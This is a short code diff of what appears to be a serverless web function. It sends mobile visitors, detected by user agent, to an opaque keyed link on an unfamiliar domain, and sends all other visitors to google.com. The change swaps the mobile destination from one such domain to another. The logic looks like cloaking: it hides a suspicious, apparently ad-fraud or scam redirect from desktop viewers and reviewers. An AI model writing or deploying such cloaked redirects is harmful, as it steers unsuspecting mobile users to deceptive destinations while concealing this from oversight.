@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://acorntar.com/exu7e711?key=3156652af9a6a1322c8719d0a88532a7", 302);
+    return Response.redirect("https://versatilesentiment.com/sti0eb2y?key=d894e263a607bac9d17f511393f94425", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
